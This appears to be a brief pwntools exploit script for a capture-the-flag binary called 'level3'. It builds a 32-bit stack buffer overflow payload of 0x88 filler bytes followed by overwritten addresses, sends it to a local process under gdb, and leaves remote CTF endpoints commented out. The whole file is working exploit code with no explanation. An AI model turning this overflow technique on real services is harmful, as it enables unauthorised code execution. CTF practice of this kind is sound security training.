from pwn import *
# from LibcSearcher import *

context.log_level = "debug"
elf = ELF('level3')
main_addr = 0x08048484
io= process('./level3')
libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
#r = remote('111.198.29.45',34924)
# r = remote("node3.buuoj.cn",27114)
gdb.attach(io,'b *0x08048482')

pay='a'*0x88+p32(0x0804a080)+p32(0x8048482)

io.recv()
io.send(pay)




io.interactive()
